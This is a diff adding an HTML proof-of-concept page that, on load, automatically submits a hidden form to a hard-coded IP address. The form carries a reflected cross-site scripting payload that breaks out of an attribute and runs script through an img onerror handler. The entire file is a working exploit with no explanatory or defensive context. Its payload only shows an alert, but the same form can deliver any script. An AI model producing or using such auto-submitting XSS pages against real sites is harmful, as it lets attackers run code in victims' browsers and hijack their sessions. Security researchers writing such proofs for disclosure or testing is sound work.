@@ -1,0 +1,9 @@
+<html>
+<body>
+<form id="xss" method="POST" action="https://72.4.154.157/">
+  <input type="hidden" name="domain" value='"><img src=x onerror=alert(document.domain)>' />
+  <input type="hidden" name="submit" value="Search" />
+</form>
+<script>document.getElementById('xss').submit();</script>
+</body>
+</html>
